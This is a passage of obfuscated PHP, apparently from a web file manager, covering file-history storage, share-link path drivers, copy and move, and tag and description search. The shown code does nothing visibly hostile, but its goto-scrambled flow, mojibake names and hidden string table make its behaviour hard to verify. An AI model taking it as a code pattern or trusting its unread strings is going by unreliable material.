($Bá–—Éùè¥[$e…ËÒÍ¿•‡[363]] as $EêÈ¿‡òÈç => $EÆ”ŒÑÁø) { if ($EÆ”ŒÑÁø[$e…ËÒÍ¿•‡[385]] == $b¢Å½ê–Óî) { $Bá–—Éùè¥[$e…ËÒÍ¿•‡[363]][$EêÈ¿‡òÈç][$e…ËÒÍ¿•‡[1107]] = $A¿Å•’º›Ù; self::saveData($Bá–—Éùè¥[$e…ËÒÍ¿•‡[1109]], $Bá–—Éùè¥[$e…ËÒÍ¿•‡[363]]); return !0; } } return !1; } public static function fileInfo($bÒãŠº¸, $F­ĞÑè¿´) { goto C‘ƒ¾œ¬ŞÎ; Dòºˆ•Æ×Õ: $dÌ„‡ÌöÖ¥ = $e©„¬ö—â[33]; foreach ($e•™¦Œô[$e©„¬ö—â[363]] as $DÄšÉóÛ => $eóë¿æ×÷ª) { if ($eóë¿æ×÷ª[$e©„¬ö—â[385]] != $F­ĞÑè¿´) { continue; } $dÌ„‡ÌöÖ¥ = $e•™¦Œô[$e©„¬ö—â[1108]] . $eóë¿æ×÷ª[$e©„¬ö—â[28]]; break; } if (!$dÌ„‡ÌöÖ¥) { show_json(LNG($e©„¬ö—â[104]), !1); } goto C¤Ãï°Î÷Ò; C¤Ãï°Î÷Ò: return IO::info($dÌ„‡ÌöÖ¥); goto DÅ©ïÃ«Œ; C‘ƒ¾œ¬ŞÎ: $e©„¬ö—â =& $_SERVER[Æ¼ôºÙï]; $e•™¦Œô = self::listData($bÒãŠº¸); if (!$e•™¦Œô) { show_json(LNG($e©„¬ö—â[104]), !1); } goto Dòºˆ•Æ×Õ; DÅ©ïÃ«Œ: } public static function fileOut($B¬ˆêˆŠ¤¥, $b¿¸ğÊ›ó¹, $d°ƒçµù„¬ = false) { $Fˆ›Ïøğšè =& $_SERVER[Æ¼ôºÙï]; $a¨´àÓ²¬Ê = self::fileInfo($B¬ˆêˆŠ¤¥, $b¿¸ğÊ›ó¹); $AŸïˆÉÑ =& $GLOBALS[$Fˆ›Ïøğšè[7]]; $d°ƒçµù„¬ = isset($AŸïˆÉÑ[$Fˆ›Ïøğšè[1073]]) && $AŸïˆÉÑ[$Fˆ›Ïøğšè[1073]] == 1; if (isset($AŸïˆÉÑ[$Fˆ›Ïøğšè[29]]) && $AŸïˆÉÑ[$Fˆ›Ïøğšè[29]] == $Fˆ›Ïøğšè[1110]) { return IO::fileOutImage($a¨´àÓ²¬Ê[$Fˆ›Ïøğšè[75]], $AŸïˆÉÑ[$Fˆ›Ïøğšè[1111]]); } IO::fileOut($a¨´àÓ²¬Ê[$Fˆ›Ïøğšè[75]], $d°ƒçµù„¬, get_path_this($B¬ˆêˆŠ¤¥)); } public static function listData($aöö§…ïé, $e¨ôË¼¢°ì = true) { goto còñ¹›†›¡; EµïèšÊ: if (substr($aöö§…ïé, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $dß˜†‘„Ó‡ = self::pathHistory($aöö§…ïé); $a–ğŞÄó§ô = array($AÓ’¤¼İ½Æ[1109] => $dß˜†‘„Ó‡ . $AÓ’¤¼İ½Æ[1096], $AÓ’¤¼İ½Æ[1108] => rtrim(get_path_father($dß˜†‘„Ó‡), $AÓ’¤¼İ½Æ[8]) . $AÓ’¤¼İ½Æ[8], $AÓ’¤¼İ½Æ[363] => array()); goto BĞè¹•œŸ†; còñ¹›†›¡: $AÓ’¤¼İ½Æ =& $_SERVER[Æ¼ôºÙï]; if ($e¨ôË¼¢°ì && !IO::exist($aöö§…ïé)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto EµïèšÊ; BĞè¹•œŸ†: $d¢òï˜÷Ğ = IO::getContent($a–ğŞÄó§ô[$AÓ’¤¼İ½Æ[1109]]); if ($d¢òï˜÷Ğ) { $BÇ‡•ºø¤‘ = json_decode($d¢òï˜÷Ğ, !0); if (is_array($BÇ‡•ºø¤‘)) { $a–ğŞÄó§ô[$AÓ’¤¼İ½Æ[363]] = $BÇ‡•ºø¤‘; } } return $a–ğŞÄó§ô; goto C“´¦Îß«Ï; C“´¦Îß«Ï: } private static function saveData($Bšö¹‹’‰, $F‡­á¥Š² ) { goto cà„…ÌÒ¦ˆ; B‡ø¡ç÷äÉ: $c‘Î‡Áá” = IO::pathFather($Bšö¹‹’‰); IO::remove($Bšö¹‹’‰); self::clearEmptyFolder($c‘Î‡Áá”); goto e³„ğ÷ñ‡õ; cà„…ÌÒ¦ˆ: $C™¥À¹¬Ï =& $_SERVER[Æ¼ôºÙï]; self::log($C™¥À¹¬Ï[1112] . $Bšö¹‹’‰ . $C™¥À¹¬Ï[67] . count($F‡­á¥Š² ), $C™¥À¹¬Ï[710]); if ($F‡­á¥Š² ) { return IO::setContent($Bšö¹‹’‰, json_encode($F‡­á¥Š² )); } goto B‡ø¡ç÷äÉ; e³„ğ÷ñ‡õ: return !0; goto bœéÖ«…¾®; bœéÖ«…¾®: } public static function clearEmptyFolder($dÑ‰«ÈÖ¤Ó) { goto AªÊù¬ˆÏÆ; bë´Œ†ö²¦: $bÄÏó»¥ß = IO::has($dÑ‰«ÈÖ¤Ó, !0); if ($bÄÏó»¥ß[$dôÛ…¯ë“[201]] > 0 || $bÄÏó»¥ß[$dôÛ…¯ë“[202]] > 0) { return; } IO::remove($dÑ‰«ÈÖ¤Ó); goto eÀ­Ø–öæ; eÀ­Ø–öæ: self::clearEmptyFolder($A·¿‹ï§ßˆ); goto Aœùƒ‘Èó©; AªÊù¬ˆÏÆ: $dôÛ…¯ë“ =& $_SERVER[Æ¼ôºÙï]; if (trim($dÑ‰«ÈÖ¤Ó, $dôÛ…¯ë“[8]) == trim(self::$_historyBase, $dôÛ…¯ë“[8])) { return; } $A·¿‹ï§ßˆ = IO::pathFather($dÑ‰«ÈÖ¤Ó); goto bë´Œ†ö²¦; Aœùƒ‘Èó©: } private static function getBasePath() { goto c õ–Ç¢; Aà¼‘†¯…•: file_put_contents($a¡ßä‡Î× . $fÁ±àë×[1116], $fÁ±àë×[33]); Model($fÁ±àë×[1113])->set($fÁ±àë×[1114], $a¡ßä‡Î×); return $a¡ßä‡Î×; goto e¥õ¾òøæ©; e¤ßù„Èœª: $a¡ßä‡Î× = DATA_PATH . $fÁ±àë×[1115]; $a¡ßä‡Î× = IO::mkdir($a¡ßä‡Î×); $a¡ßä‡Î× = rtrim($a¡ßä‡Î×, $fÁ±àë×[8]) . $fÁ±àë×[8]; goto Aà¼‘†¯…•; c õ–Ç¢: $fÁ±àë× =& $_SERVER[Æ¼ôºÙï]; $a¡ßä‡Î× = Model($fÁ±àë×[1113])->get($fÁ±àë×[1114]); if (IO::exist($a¡ßä‡Î×)) { return $a¡ßä‡Î×; } goto e¤ßù„Èœª; e¥õ¾òøæ©: } } goto bÓÄÄ¼»; cØ´öœÓÅ÷: class PathDriverDbShareItem extends PathDriverDB { public function __construct($e£èŠÀÏ·…) { $this->pathParse = $e£èŠÀÏ·…; $this->model = Model($_SERVER[Æ¼ôºÙï][1182]); } public function getPathOuter($B‹ğ´©ÒãÜ) { $CÒ·Âƒ›Š» =& $_SERVER[Æ¼ôºÙï]; if (!$B‹ğ´©ÒãÜ) { return $B‹ğ´©ÒãÜ; } $Cöªİ ŒÁ´ = $this->parse($B‹ğ´©ÒãÜ); return trim(KodIO::makeShare($this->pathParse[$CÒ·Âƒ›Š»[385]], $Cöªİ ŒÁ´[$CÒ·Âƒ›Š»[385]]), $CÒ·Âƒ›Š»[8]); } protected function infoParse($B¸ƒÚ²É’ƒ, $cï½ÔÇ¾™£ = false, $Bàù÷‚£§ù = false) { $eÊ£©ÀœËí =& $_SERVER[Æ¼ôºÙï]; $c‡ÁïŠÓ = $this->pathParse[$eÊ£©ÀœËí[385]]; $DÈ¸ã¯°—Ü = trim($this->pathParse[$eÊ£©ÀœËí[1043]], $eÊ£©ÀœËí[8]); return Action($eÊ£©ÀœËí[1189])->sharePathInfo($c‡ÁïŠÓ, $DÈ¸ã¯°—Ü); } public function infoFull($Dá·µ‚„†) { $fÓøÉã£ÓÌ =& $_SERVER[Æ¼ôºÙï]; $bËÍîµ“¤¤ = explode($fÓøÉã£ÓÌ[8], trim($Dá·µ‚„†, $fÓøÉã£ÓÌ[8])); if (count($bËÍîµ“¤¤) > 1) { $f÷ˆÙÑ†“ = implode($fÓøÉã£ÓÌ[8], array_splice($bËÍîµ“¤¤, 1)); $Fä¸Öê½ = $this->model->pathInfoByPath($bËÍîµ“¤¤[0], $f÷ˆÙÑ†“); if (!$Fä¸Öê½) { return !1; } $this->pathParse[$fÓøÉã£ÓÌ[1043]] = $Fä¸Öê½[$fÓøÉã£ÓÌ[387]]; } return $this->infoParse($Dá·µ‚„†); } public function listAll($eõ Ø×ËÄ‚) { goto e÷‚•‰Ê¬; e÷‚•‰Ê¬: $c—Ãá¯´Øç =& $_SERVER[Æ¼ôºÙï]; $FÁ…Åˆ‹ƒ— = IO::info($this->pathParse[$c—Ãá¯´Øç[75]]); if (!$FÁ…Åˆ‹ƒ—) { return array(); } goto cŒÖÀáŸ¦; fŸŞƒÒÆ×: foreach ($C©›âšµ×¡ as &$då¬¯ç“ÔÑ) { check_abort(); $då¬¯ç“ÔÑ[$c—Ãá¯´Øç[84]] = $EÓóè£«->_shareItemeParse($då¬¯ç“ÔÑ[$c—Ãá¯´Øç[84]], $cÕ¬‡å¦ã©); } unset($då¬¯ç“ÔÑ); return $C©›âšµ×¡; goto Fí‰÷ŠÂá; cŒÖÀáŸ¦: $C©›âšµ×¡ = $this->model->listAll($eõ Ø×ËÄ‚); $cÕ¬‡å¦ã© = Model($c—Ãá¯´Øç[552])->getInfo($FÁ…Åˆ‹ƒ—[$c—Ãá¯´Øç[457]]); $EÓóè£« = Action($c—Ãá¯´Øç[1189]); goto fŸŞƒÒÆ×; Fí‰÷ŠÂá: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($d‘â”¨­¥¢) { $this->pathParse = $d‘â”¨­¥¢; $this->model = Model($_SERVER[Æ¼ôºÙï][1182]); } protected function infoParse($Fˆä”›¬ƒé, $dÜ¥°†÷Í = false, $DïØÍ‡†¾Å = false) { $C‡í­ãö«Ö =& $_SERVER[Æ¼ôºÙï]; return Action($C‡í­ãö«Ö[1049])->sharePathInfo($this->pathParse[$C‡í­ãö«Ö[75]], !0); } public function listPath($aŸ„µ¬µ, $EæÛøÊÖ÷ = false) { $dÙ³Áø„‡ =& $_SERVER[Æ¼ôºÙï]; $D„Ü¡¤ˆ· = parent::listPath($aŸ„µ¬µ, $EæÛøÊÖ÷); foreach ($D„Ü¡¤ˆ· as $a“ŒÛ„Ì–â => $EÀ‚Õ²˜Û¦) { if (!in_array($a“ŒÛ„Ì–â, array($dÙ³Áø„‡[73], $dÙ³Áø„‡[74]))) { continue; } foreach ($EÀ‚Õ²˜Û¦ as $a„Ùç => $f¥æ¦é…¸ï) { $D„Ü¡¤ˆ·[$a“ŒÛ„Ì–â][$a„Ùç] = Action($dÙ³Áø„‡[1049])->shareItemInfo($f¥æ¦é…¸ï); } } return $D„Ü¡¤ˆ·; } public function listAll($a„˜ÅÏÙÜŞ) { goto bË¼—¾¬ğÉ; E·•è×ªË: $cå§Íùó¨ = $this->model->listAll($a„˜ÅÏÙÜŞ); foreach ($cå§Íùó¨ as &$A¡äÄÔŒ¿Ä) { $A¡äÄÔŒ¿Ä[$C‰±â‚«Á[84]] = Action($C‰±â‚«Á[1049])->shareItemInfo($A¡äÄÔŒ¿Ä[$C‰±â‚«Á[84]]); } unset($A¡äÄÔŒ¿Ä); goto CàÜŒ¦°š¾; bË¼—¾¬ğÉ: $C‰±â‚«Á =& $_SERVER[Æ¼ôºÙï]; $Cô–”ğ’ãµ = IO::info($this->pathParse[$C‰±â‚«Á[75]]); if (!$Cô–”ğ’ãµ) { return array(); } goto E·•è×ªË; CàÜŒ¦°š¾: return $cå§Íùó¨; goto e»Áâ›×â®; e»Áâ›×â®: } } class PathDriverDriverShareItem { public function __construct($c°Ú¢“ò“) { $this->pathParse = $c°Ú¢“ò“; } public function __call($EÏä¶Ã»ÒÑ, $fò ñæÀ…†) { $Cè‰×Æ‰Í =& $_SERVER[Æ¼ôºÙï]; if (method_exists($this, $EÏä¶Ã»ÒÑ)) { return; } $FŞµ¾Šëµ˜ = call_user_func_array(array($Cè‰×Æ‰Í[1190], $EÏä¶Ã»ÒÑ), $fò ñæÀ…†); $Bµ¿“–æ¼Ô = array($Cè‰×Æ‰Í[1191], $Cè‰×Æ‰Í[1192], $Cè‰×Æ‰Í[1193], $Cè‰×Æ‰Í[1194], $Cè‰×Æ‰Í[507], $Cè‰×Æ‰Í[509], $Cè‰×Æ‰Í[1195], $Cè‰×Æ‰Í[106], $Cè‰×Æ‰Í[1196], $Cè‰×Æ‰Í[1197]); if (in_array($EÏä¶Ã»ÒÑ, $Bµ¿“–æ¼Ô)) { $FŞµ¾Šëµ˜ = $this->getPathOuter($FŞµ¾Šëµ˜); } return $FŞµ¾Šëµ˜; } public function copy($D¿Ïé›ºä‹, $A•ğÜ‰µ†å, $Fµ²£ÓëÁ = false) { return $this->copyMove($D¿Ïé›ºä‹, $A•ğÜ‰µ†å, $Fµ²£ÓëÁ, $_SERVER[Æ¼ôºÙï][507]); } public function move($D±Ô¶Ì’œ­, $D¬·°ŞæÎ, $aê²«É®£‘ = false) { return $this->copyMove($D±Ô¶Ì’œ­, $D¬·°ŞæÎ, $aê²«É®£‘, $_SERVER[Æ¼ôºÙï][509]); } private function copyMove($B„º™²×”», $B™š›™õ§œ, $D Çï¢ŠÅô, $AæäŸğèÆ) { goto FºõæËÊ•÷; cæ„ÏŸˆùè: if ($D¾¿¡Õ‰‘í->pathParse[$dØ–½ÕÖÜ[1027]]) { $B™š›™õ§œ = $D¾¿¡Õ‰‘í->pathParse[$dØ–½ÕÖÜ[1027]]; } else { $B™š›™õ§œ = $DöË¼Áà¡î; } $d·šµîóøĞ = IO::copyMove($B„º™²×”», $B™š›™õ§œ, $D Çï¢ŠÅô, $AæäŸğèÆ); $d·šµîóøĞ = $this->getPathOuter($d·šµîóøĞ); goto fØ½‘‰­ëÒ; fØ½‘‰­ëÒ: return $d·šµîóøĞ; goto dğë¼“ÙŸÈ; FºõæËÊ•÷: $dØ–½ÕÖÜ =& $_SERVER[Æ¼ôºÙï]; $DöË¼Áà¡î = $B™š›™õ§œ; $D¾¿¡Õ‰‘í = IO::driverMake($B™š›™õ§œ); goto cæ„ÏŸˆùè; dğë¼“ÙŸÈ: } public function pathThis($CïÂ•¢‡®‡) { return get_path_this($this->pathParse[$_SERVER[Æ¼ôºÙï][75]]); } public function pathFather($aÜ‹Îœ…¬è) { return get_path_father($this->pathParse[$_SERVER[Æ¼ôºÙï][75]]); } public function iconvSystem($D‚Ù¨æÑ²) { return $D‚Ù¨æÑ²; } protected function infoParse($c×ãæª–, $bÃöÂÕâ³î = false) { $bõ¼³°ì«¶ =& $_SERVER[Æ¼ôºÙï]; $d†ª©‰¤š¦ = $this->pathParse[$bõ¼³°ì«¶[455]][$bõ¼³°ì«¶[1050]] . $this->pathParse[$bõ¼³°ì«¶[1043]]; if ($bÃöÂÕâ³î) { $Dî¥Ø¬êÉ× = IO::infoWithChildren($d†ª©‰¤š¦); } else { $Dî¥Ø¬êÉ× = IO::info($d†ª©‰¤š¦); } $A´‰äâµÆ = $this->pathParse[$bõ¼³°ì«¶[455]]; return Action($bõ¼³°ì«¶[1189])->_shareItemeParse($Dî¥Ø¬êÉ×, $A´‰äâµÆ); } public function listAll($D´Ÿòğ¶­) { $aÌç‹ÃÒ“Î =& $_SERVER[Æ¼ôºÙï]; $Cğ‚§À£½å = IO::listAll($D´Ÿòğ¶­); $D‚‡»ÉÀ = $this->pathParse[$aÌç‹ÃÒ“Î[455]]; foreach ($Cğ‚§À£½å as &$dÉ™í‹Ç Ë) { check_abort(); $dÉ™í‹Ç Ë = array_merge(IO::info($dÉ™í‹Ç Ë[$aÌç‹ÃÒ“Î[75]]), $dÉ™í‹Ç Ë); $dÉ™í‹Ç Ë[$aÌç‹ÃÒ“Î[84]] = Action($aÌç‹ÃÒ“Î[1189])->_shareItemeParse($dÉ™í‹Ç Ë, $D‚‡»ÉÀ); } unset($dÉ™í‹Ç Ë); return $Cğ‚§À£½å; } public function getPathOuter($CöğË§ºÔ¢) { goto FÖ»Àñ™®Î; E©ÈÅ‚‰Àã: $dšåïŸáÒ¶ = KodIO::clear($CöğË§ºÔ¢); $A÷êî´³ = KodIO::clear($this->pathParse[$F©¦á¤ßÀò[455]][$F©¦á¤ßÀò[1050]]); $DØŠ’´ï±¥ = substr($dšåïŸáÒ¶, strlen($A÷êî´³)); goto A¹¢Æ˜œÊÖ; FÖ»Àñ™®Î: $F©¦á¤ßÀò =& $_SERVER[Æ¼ôºÙï]; $e×«¡„¶ô = KodIO::parse($CöğË§ºÔ¢); if ($e×«¡„¶ô[$F©¦á¤ßÀò[29]] == KodIO::KOD_SHARE_ITEM) { return $e×«¡„¶ô[$F©¦á¤ßÀò[75]]; } goto E©ÈÅ‚‰Àã; A¹¢Æ˜œÊÖ: if (substr($dšåïŸáÒ¶, 0, strlen($A÷êî´³)) != $A÷êî´³) { return !1; } return $this->pathParse[$F©¦á¤ßÀò[1044]] . $F©¦á¤ßÀò[8] . ltrim($DØŠ’´ï±¥, $F©¦á¤ßÀò[8]); goto EØ®åÄ°ëë; EØ®åÄ°ëë: } public function getType() { $b¬‰ïìŞ³ =& $_SERVER[Æ¼ôºÙï]; $C¦ëéºñàÎ = str_replace($b¬‰ïìŞ³[71], $b¬‰ïìŞ³[33], get_class($this)); return strtolower($C¦ëéºñàÎ); } public function isTypeObject($aƒ¢¾”«¥Ö) { return IO::isTypeObject($aƒ¢¾”«¥Ö); } public function info($Fš³ÌÌ’–ê) { return $this->infoParse($Fš³ÌÌ’–ê); } public function infoAuth($Cßã¬ÖÏùÍ) { return $this->infoParse($Cßã¬ÖÏùÍ); } public function infoWithChildren($F…êëç³Æ) { return $this->infoParse($F…êëç³Æ, !0); } public function infoFull($bˆ¦ÌÚÑÈ×) { return $this->infoParse($bˆ¦ÌÚÑÈ×); } } goto Aœˆ¹ÑòÁ; AÖ­‚ ğô²: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($CŸùÅØ‚ ) { goto d—äÁğ‚É¹; BŸ‰‘µ‰â: if (!$c¥ÙÅïŒÏœ[$dØ“§‡™Œ’[167]]) { $Eœ‡í×‘ÉÜ = array_to_keyvalue($Eæíñ‡Ì¬ø, $dØ“§‡™Œ’[33], $dØ“§‡™Œ’[167]); $B‚§Ş‹ã›Ì = implode($dØ“§‡™Œ’[47], $Eœ‡í×‘ÉÜ); $d¥æ–Şäù« = $dØ“§‡™Œ’[1903]; } $C‹øå ëä² = explode($dØ“§‡™Œ’[47], trim($B‚§Ş‹ã›Ì, $dØ“§‡™Œ’[47])); return array($d¥æ–Şäù«, $C‹øå ëä²); goto aš¿Á×ó±É; AØÏ´ÊÍØ: if (!$c¥ÙÅïŒÏœ) { return array(); } $B‚§Ş‹ã›Ì = $c¥ÙÅïŒÏœ[$dØ“§‡™Œ’[167]]; $d¥æ–Şäù« = $dØ“§‡™Œ’[7]; goto BŸ‰‘µ‰â; d—äÁğ‚É¹: $dØ“§‡™Œ’ =& $_SERVER[Æ¼ôºÙï]; $Eæíñ‡Ì¬ø = KodIO::fileTypeList(); $c¥ÙÅïŒÏœ = $Eæíñ‡Ì¬ø[$CŸùÅØ‚ ]; goto AØÏ´ÊÍØ; aš¿Á×ó±É: } public function listPathType($a¬¸ºíêãÃ) { $e®Ã÷ï‡¬ô =& $_SERVER[Æ¼ôºÙï]; $b´‰£‡£ì½ = $this->fileTypeWhere($a¬¸ºíêãÃ); if (!$b´‰£‡£ì½) { return array(); } $e´‚‰¿ÎÜ‹ = array($e®Ã÷ï‡¬ô[538] => SourceModel::TYPE_USER, $e®Ã÷ï‡¬ô[539] => USER_ID, $e®Ã÷ï‡¬ô[535] => 0, $e®Ã÷ï‡¬ô[536] => $b´‰£‡£ì½); return $this->listSource($e´‚‰¿ÎÜ‹); } public function listSearch($e½ä†Š É, $aÛ˜ïŸ‹¨ñ = 300) { goto Aàøˆ¦•»; BÚÓ–¦ñÈ: $this->_listSearchBindPinyin($e½ä†Š É, $AØóôÌŒˆ, $Cå‘Ì£œ¦’); $this->alias($E¸”±ó·Ìô[505])->_makeOrder(); $AØóôÌŒˆ = $this->parseWhereLike($AØóôÌŒˆ); goto E¦Ü¼–ÄÃğ; E¹ÑÌÖ‘Şî: if (!isset($AØóôÌŒˆ[$E¸”±ó·Ìô[414]])) { $AØóôÌŒˆ[$E¸”±ó·Ìô[414]] = 0; } $Cå‘Ì£œ¦’ = $E¸”±ó·Ìô[1905]; $C³›±š¤¹š = $Cå‘Ì£œ¦’; goto BÚÓ–¦ñÈ; E¦Ü¼–ÄÃğ: $eÓÜºâƒ³ = $this->distinct(!0)->field($Cå‘Ì£œ¦’)->where($AØóôÌŒˆ)->selectPage($aÛ˜ïŸ‹¨ñ); $this->_listSearchDesc($eÓÜºâƒ³, $e½ä†Š É, $C³›±š¤¹š); $this->_listSearchTag($eÓÜºâƒ³, $e½ä†Š É, $C³›±š¤¹š); goto cäÙ”±ªÖİ; Aàøˆ¦•»: $E¸”±ó·Ìô =& $_SERVER[Æ¼ôºÙï]; if (isset($e½ä†Š É[$E¸”±ó·Ìô[1747]]) && $e½ä†Š É[$E¸”±ó·Ìô[1747]]) { $e½ä†Š É[$E¸”±ó·Ìô[1747]] = str_replace($E¸”±ó·Ìô[376], $E¸”±ó·Ìô[1904], trim($e½ä†Š É[$E¸”±ó·Ìô[1747]])); } $AØóôÌŒˆ = $this->_parseSearchWhere($e½ä†Š É); goto E¹ÑÌÖ‘Şî; cäÙ”±ªÖİ: $this->_listSearchGroupTag($eÓÜºâƒ³, $e½ä†Š É, $C³›±š¤¹š); $this->_listDataApply($eÓÜºâƒ³[$E¸”±ó·Ìô[363]]); $this->_listMake($eÓÜºâƒ³); goto FíêğŠ¹Î‚; FíêğŠ¹Î‚: return $eÓÜºâƒ³; goto aßÖçÅìËÊ; aßÖçÅìËÊ: } private function _listSearchTag(&$FŠ‚Ñë¸ø, $FÛÅãÜ‘§ª, $EçŞš²ğëÇ) { goto d²ˆ¤³“£; A±ŒãØ×: if (!$b¹´¶§¹šÇ) { return; } $E¿Ó­Ò‚Ç» = array($Dƒåáß—ˆÍ[410] => array($Dƒåáß—ˆÍ[7], $b¹´¶§¹šÇ), $Dƒåáß—ˆÍ[1502] => USER_ID); $e©õÑ¹¢ô = Model($Dƒåáß—ˆÍ[411])->field($Dƒåáß—ˆÍ[75])->where($E¿Ó­Ò‚Ç»)->select(); goto C–Šø¤«¹; A·§ê˜Ã¡: $b¹´¶§¹šÇ = array(); $EÏÍŒ’“‚« = $FÛÅãÜ‘§ª[$Dƒåáß—ˆÍ[1747]]; foreach ($FŒ±Ãéˆ as $C¸‰‡Œ›¢‹) { $cÚ‡÷°™ = $C¸‰‡Œ›¢‹[$Dƒåáß—ˆÍ[28]]; $Cç®¥ˆ°œ = str_replace($Dƒåáß—ˆÍ[50], $Dƒåáß—ˆÍ[33], Pinyin::encode($cÚ‡÷°™)); if (stripos($cÚ‡÷°™, $EÏÍŒ’“‚«) !== !1 || stripos($Cç®¥ˆ°œ, $EÏÍŒ’“‚«) !== !1) { $b¹´¶§¹šÇ[] = $C¸‰‡Œ›¢‹[$Dƒåáß—ˆÍ[385]]; } } goto A±ŒãØ×; C–Šø¤«¹: $e©õÑ¹¢ô = array_to_keyvalue($e©õÑ¹¢ô, $Dƒåáß—ˆÍ[33], $Dƒåáß—ˆÍ[75]); $fÚ¸«¯Š›Ü = array_unique($e©õÑ¹¢ô); $this->_listSearchMerge($FŠ‚Ñë¸ø, $FÛÅãÜ‘§ª, $EçŞš²ğëÇ, $fÚ¸«¯Š›Ü); goto b¼¬Ş¶»å·; d²ˆ¤³“£: $Dƒåáß—ˆÍ =& $_SERVER[Æ¼ôºÙï]; if (!$FÛÅãÜ‘§ª[$Dƒåáß—ˆÍ[1747]] || $FŠ‚Ñë¸ø[$Dƒåáß—ˆÍ[360]][$Dƒåáß—ˆÍ[349]] > 1) { return; } $FŒ±Ãéˆ = Model($Dƒåáß—ˆÍ[1906])->listData(); goto A·§ê˜Ã¡; b¼¬Ş¶»å·: } private function _listSearchDesc(&$fô”«”²¬…, $F½ô³ñ½, $CÎ„‹¶’³) { goto E¯ŞÄº¢ì; eÉÍ–õ…×: $f¶Ñëìï—¾ = Model($DíºòÎ¯Ñ—[521])->field($DíºòÎ¯Ñ—[387])->where($eäÔ¯”’¬ô)->select(); $eãä«·¡ = array_to_keyvalue($f¶Ñëìï—¾, $DíºòÎ¯Ñ—[33], $DíºòÎ¯Ñ—[387]); $this->_listSearchMerge($fô”«”²¬…, $F½ô³ñ½, $CÎ„‹¶’³, $eãä«·¡); goto bÂØ²ç‘ó’; E¯ŞÄº¢ì: $DíºòÎ¯Ñ— =& $_SERVER[Æ¼ôºÙï]; if (!$F½ô³ñ½[$DíºòÎ¯Ñ—[1747]] || $fô”«”²¬…[$DíºòÎ¯Ñ—[360]][$DíºòÎ¯Ñ—[349]] > 1) { return; } $FòÆ„‹‰¯Ü = $this->listSearchChildren($F½ô³ñ½[$DíºòÎ¯Ñ—[479]]); goto dÒ™ï‘ÊÕ£; dÒ™ï‘ÊÕ£: $FòÆ„‹‰¯Ü = array_unique($FòÆ„‹‰¯Ü); if (!$FòÆ„‹‰¯Ü) { return; } $eäÔ¯”’¬ô = array($DíºòÎ¯Ñ—[387] => array($DíºòÎ¯Ñ—[7], $FòÆ„‹‰¯Ü), $DíºòÎ¯Ñ—[92] => $DíºòÎ¯Ñ—[422], $DíºòÎ¯Ñ—[368] => array($DíºòÎ¯Ñ—[375], $DíºòÎ¯Ñ—[1749] . $F½ô³ñ½[$DíºòÎ¯Ñ—[1747]] . $DíºòÎ¯Ñ—[1749])); goto eÉÍ–õ…×; bÂØ²ç‘ó’: } private function _listSearchGroupTag(&$eö©¾Òí‚í, $fßá©±Æ·£, $Dç´ğèïª“) { goto AÏËë…Ú‹Ü; AÏËë…Ú‹Ü: $Bìå¢¢ïÀ =& $_SERVER[Æ¼ôºÙï]; if (!$fßá©±Æ·£[$Bìå¢¢ïÀ[1747]] || $eö©¾Òí‚í[$Bìå¢¢ïÀ[360]][$Bìå¢¢ïÀ[349]] > 1 || !$fßá©±Æ·£[$Bìå¢¢ïÀ[479]]) { return; } $Dº‘‘’·–¬ = $this->sourceInfo($fßá©±Æ·£[$Bìå¢¢ïÀ[479]]); goto D„Œ¯ôùõÂ; E¡èº—½³Ù: $Dç…Òˆ˜÷ì = array_to_keyvalue($Dç…Òˆ˜÷ì, $Bìå¢¢ïÀ[33], $Bìå¢¢ïÀ[75]); $FÁÆŞƒ¥æÈ = array_unique($Dç…Òˆ˜÷ì); $this->_listSearchMerge($eö©¾Òí‚í, $fßá©±Æ·£, $Dç´ğèïª“, $FÁÆŞƒ¥æÈ); goto a×´™Ê±š‰; aÃŞª¯ÇÆ£: $eÌ·„•’Òì = array(); $b˜Î­ğ²¡ = $fßá©±Æ·£[$Bìå¢¢ïÀ[1747]]; foreach ($D—È–ë¤×®[$Bìå¢¢ïÀ[363]] as $fÕ«š±Š±ğ) { $BÅˆ©Ù´Ïª = $fÕ«š±Š±ğ[$Bìå¢¢ïÀ[28]]; $f‹›õ‘æ‚ä = str_replace($Bìå¢¢ïÀ[50], $Bìå¢¢ïÀ[33], Pinyin::encode($BÅˆ©Ù´Ïª)); if (stripos($BÅˆ©Ù´Ïª, $b˜Î­ğ²¡) !== !1 || stripos($f‹›õ‘æ‚ä, $b˜Î­ğ²¡) !== !1) { $eÌ·„•’Òì[] = $fÕ«š±Š±ğ[$Bìå¢¢ïÀ[385]]; } } goto aëÊÍ»³á¸; D„Œ¯ôùõÂ: if (!$Dº‘‘’·–¬ || $Dº‘‘’·–¬[$Bìå¢¢ïÀ[389]] != SourceModel::TYPE_GROUP) { return; } $aÂ–Æï©­¢ = $Dº‘‘’·–¬[$Bìå¢¢ïÀ[474]]; $D—È–ë¤×® = Model($Bìå¢¢ïÀ[1907])->get($aÂ–Æï©­¢); goto aÃŞª¯ÇÆ£; aëÊÍ»³á¸: if (!$eÌ·„•’Òì) { return; } $A»ˆÃ®©Û§ = array($Bìå¢¢ïÀ[410] => array($Bìå¢¢ïÀ[7], $eÌ·„•’Òì), $Bìå¢¢ïÀ[1502] => 0, $Bìå¢¢ïÀ[29] => $Bìå¢¢ïÀ[1767] . $aÂ–Æï©­¢); $Dç…Òˆ˜÷ì = Model($Bìå¢¢ïÀ[411])->field($Bìå¢¢ïÀ[75])->where($A»ˆÃ®©Û§)->select(); goto E¡èº—½³Ù; a×´™Ê±š‰: } private function _listSearchMerge(&$BÎÃ˜™æ™º, $cæ™‘–³è˜, $fŒÜø¸“ñ, $f´È”¹¨“) { goto b½â…Óò¹»; b½â…Óò¹»: $EÉ§Ï«äµË =& $_SERVER[Æ¼ôºÙï]; if (!$f´È”¹¨“) { return; } $eÎİä®‰ª = array_to_keyvalue($BÎÃ˜™æ™º[$EÉ§Ï«äµË[363]], $EÉ§Ï«äµË[33], $EÉ§Ï«äµË[387]); goto DÁ›õºËÙ£; DŒÁØÍëî‹: $Bî“åÒøÖ´ = $this->field($fŒÜø¸“ñ)->where($f‚šµŠ·š”)->select(); if (!$Bî“åÒøÖ´) { return; } $a„¸æ³Âï = array(); goto cøæšÆ±Åæ; DÁ›õºËÙ£: $cÑœ‘ÀÃª = array_diff($f´È”¹¨“, $eÎİä®‰ª); if (!$cÑœ‘ÀÃª) { return; } $f‚šµŠ·š” = 